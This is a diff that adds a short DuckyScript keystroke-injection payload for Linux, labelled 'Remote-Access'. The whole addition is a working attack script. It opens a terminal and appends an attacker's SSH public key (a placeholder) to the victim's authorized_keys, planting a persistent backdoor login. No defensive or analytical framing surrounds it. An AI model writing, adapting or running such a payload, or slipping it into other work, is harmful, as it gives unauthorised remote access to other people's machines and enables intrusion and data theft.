@@ -1,0 +1,15 @@
+REM Author: UNC0V3R3D
+REM Description: Adds an attacker's SSH public key to the target Linux user's authorized_keys.
+REM Version: 1.0
+REM Category: Remote-Access
+REM Target: Linux (all distros)
+REM Requirements: SSH server running (sshd), write access to ~/.ssh
+DELAY 1000
+CTRL ALT t
+DELAY 1500
+STRING mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ATTACKER_SSH_PUBLIC_KEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
+ENTER
+DELAY 500
+STRING exit
+ENTER
+REM End of payload
